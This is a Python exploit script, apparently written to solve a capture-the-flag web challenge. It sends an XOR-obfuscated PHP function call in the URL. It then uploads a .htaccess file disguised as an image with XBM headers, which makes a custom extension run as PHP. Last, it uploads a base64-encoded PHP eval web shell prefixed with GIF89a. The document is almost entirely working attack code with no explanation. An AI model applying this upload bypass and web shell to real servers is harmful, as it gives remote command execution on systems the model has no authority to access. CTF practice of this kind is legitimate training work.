# import requests
# xbmhtaccess = b"""
# #define width 1
# #define height 1
# AddType application/x-httpd-php .test
# php_value auto_append_file "php://filter/convert.base64-decode/resource=1.test"
# """

# # 或者xbmhtaccess=b"""\x00\x00\x85\x48\x85\x18
# # AddType application/x-httpd-php .test
# # php_value auto_append_file
# # "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/1.test"
# # """

# url = "http://9fd4f5c0-f1b8-4e4b-9c10-c4de6f143333.node4.buuoj.cn:81/?_=$%7B%86%9E%9C%8D%5E%d9%d9%d9%d9%7D%7B%d9%7D();&%d9=get_the_flag"
# # upload
# files = {
#     'file': ('.htaccess', xbmhtaccess, 'image/png')
# }
# r = requests.post(url, files=files)
# print(r.text)
import requests
import time

url = r"http://9fd4f5c0-f1b8-4e4b-9c10-c4de6f143333.node4.buuoj.cn:81/?_=${%80%80%80%80^%df%c7%c5%d4}{%80}();&%80=get_the_flag"
session = requests.session()
htaccess_content = '''
#define width 1337
#define height 1337
AddType application/x-httpd-php .a
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.a"
'''
files_htaccess = {'file': (
    '.htaccess', htaccess_content, 'image/jpeg')}
res_hta = session.post(url, files=files_htaccess)
print(res_hta.text)
shell_file = 'GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg=='
files_shell = {'file': (
    'shell.a', shell_file, 'image/jpeg')}
res_jpg = session.post(url, files=files_shell)

print(res_jpg.text)
